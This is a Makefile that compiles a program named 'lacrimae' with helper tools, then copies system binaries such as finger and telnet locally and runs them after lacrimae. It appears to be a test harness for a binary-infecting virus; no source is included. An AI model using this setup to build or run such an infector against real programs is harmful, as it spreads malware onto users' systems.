CFLAGS=-Wall -Os -fpie -pie -ggdb

all: lacrimae

lacrimae: lacrimae.c patch.c config.h
	gcc $(CFLAGS) lacrimae.c -o lacrimae
	gcc patch.c -o patch
	./patch

badinsn: badinsn.c
	gcc -pie -s $< -o $@

test-mem: lacrimae badinsn
	-cp -f /usr/bin/finger .
	-cp -f /usr/bin/telnet .
	echo -ne > trace.log	
	export MALLOC_TRACE=trace.log && ./lacrimae
	mtrace trace.log

test: lacrimae badinsn
	./lacrimae
	-cp -f /usr/bin/finger .
	./lacrimae
	-cp -f /usr/bin/telnet .
	./finger
	./telnet

test2: lacrimae badinsn
	-cp -f /usr/bin/finger .
	-cp -f /usr/bin/finger finger2
	-cp -f /usr/bin/finger finger3
	-cp -f /usr/bin/finger finger4
	./lacrimae
	./finger
	./finger2
	./finger3
	./finger4

test-pre: lacrimae badinsn
	-cp -f /usr/bin/finger .
	prelink ./finger
	./lacrimae
	./finger

clean:
	-@rm -f finger* telnet lacrimae patch trace.log badinsn

.PHONY: all test-mem test test2 clean
